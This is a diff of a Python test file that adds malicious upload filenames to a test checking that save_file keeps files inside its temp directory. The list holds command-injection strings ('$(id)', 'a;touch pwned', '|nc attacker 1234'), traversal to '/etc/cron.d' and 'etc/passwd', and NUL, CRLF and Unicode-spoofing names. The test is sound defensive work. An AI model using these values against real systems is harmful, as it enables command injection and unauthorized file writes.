@@ -69,7 +69,22 @@ def test_save_file_ignores_attacker_controlled_filename(app):
 
     control_tmp = os.path.realpath(os.path.join(app.root_path, "control", "tmp"))
     for evil in ["$(id)/x.txt", "../../../../tmp/evil/y.txt", "a;touch pwned;.txt",
-                 "`whoami`/z", "|nc attacker 1234/x"]:
+                 "`whoami`/z", "|nc attacker 1234/x",
+                 # Windows-style traversal: os.path.split on POSIX treats "\"
+                 # as an ordinary character, so a secure_filename-style fix
+                 # must strip it too.
+                 "..\\..\\..\\evil.txt",
+                 # Absolute path: os.path.join(base, "/abs") DISCARDS base.
+                 "/etc/cron.d/evil.txt",
+                 # Embedded NUL: open() raises ValueError if it reaches a path.
+                 "evil\x00.txt",
+                 # CRLF: header injection if a name flows into Content-Disposition.
+                 "evil\r\n.txt",
+                 # Degenerate names secure_filename collapses to "".
+                 "", ".", "..",
+                 # Fullwidth solidus (U+FF0F) and RTL override (U+202E):
+                 # bypass naive separator checks / spoof displayed names.
+                 "／..／etc／passwd", "‮gnp.evil.txt"]:
         path = u.save_file("control/tmp", _EvilFile(evil))
         try:
             base = os.path.basename(path)
